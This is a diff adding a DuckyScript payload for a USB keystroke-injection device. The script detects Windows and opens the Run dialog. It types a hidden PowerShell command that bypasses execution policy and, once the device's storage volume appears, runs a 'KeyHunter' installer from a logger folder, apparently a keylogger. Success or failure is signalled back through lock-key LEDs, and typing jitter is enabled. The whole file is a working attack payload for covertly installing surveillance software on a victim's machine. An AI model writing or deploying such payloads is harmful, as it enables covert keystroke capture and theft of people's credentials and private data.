@@ -1,0 +1,84 @@
+ATTACKMODE HID
+EXTENSION PASSIVE_WINDOWS_DETECT
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+    $_OS = #NOT_WINDOWS
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+END_EXTENSION
+
+DEFINE #DUCKY_DRIVER_LABEL DUCKY
+DEFINE #RESULT_WAIT_TRIES 7500
+
+IF ($_OS == WINDOWS) THEN
+    $_JITTER_ENABLED = TRUE
+    $_JITTER_MAX = 4
+
+    REM Start hidden PowerShell before exposing STORAGE.
+    REM The process waits for the DUCKY volume so File Explorer cannot
+    REM steal focus while the command is being typed.
+    DELAY 300
+    GUI m
+    DELAY 350
+    GUI r
+    DELAY 700
+
+    STRING powershell -NoP -W Hidden -EP Bypass -C "
+    DELAY 40
+    STRING 1..900|%{if(!$d){
+    DELAY 40
+    STRING $d=@([IO.DriveInfo]::GetDrives()|
+    DELAY 40
+    STRING ? IsReady|? VolumeLabel -eq #DUCKY_DRIVER_LABEL)[0].Name;
+    DELAY 40
+    STRING sleep -m 100}};if($d){
+    DELAY 40
+    STRING sleep -m 3000;
+    DELAY 40
+    STRING &($d+'duckyscripts\library\logger\
+    DELAY 40
+    STRING KeyHunter\Install\Install-KeyHunter.ps1')}"
+    ENTER
+
+    REM Allow Windows to start the hidden process waiting for DUCKY.
+    DELAY 700
+
+    REM Remember only the lock states used for the result signal.
+    REM The installer pulses a lock state and restores it afterward.
+    VAR $RESULT_SCROLL_BASE = $_SCROLLLOCK_ON
+    VAR $RESULT_CAPS_BASE = $_CAPSLOCK_ON
+
+    REM Expose mass storage only now.
+    ATTACKMODE HID STORAGE
+
+    REM Wait up to 150 seconds for the PowerShell result.
+    VAR $RESULT_TRIES = #RESULT_WAIT_TRIES
+
+    WHILE (($_SCROLLLOCK_ON == $RESULT_SCROLL_BASE) && ($_CAPSLOCK_ON == $RESULT_CAPS_BASE) && ($RESULT_TRIES > 0))
+        DELAY 20
+        $RESULT_TRIES = ($RESULT_TRIES - 1)
+    END_WHILE
+
+    REM A Caps Lock change indicates an error.
+    IF ($_CAPSLOCK_ON != $RESULT_CAPS_BASE) THEN
+        LED_R
+        STOP_PAYLOAD
+    END_IF
+
+    REM A Scroll Lock change indicates success.
+    IF ($_SCROLLLOCK_ON != $RESULT_SCROLL_BASE) THEN
+        LED_G
+    ELSE
+        REM Timed out before receiving the result signal.
+        LED_R
+        STOP_PAYLOAD
+    END_IF
+END_IF
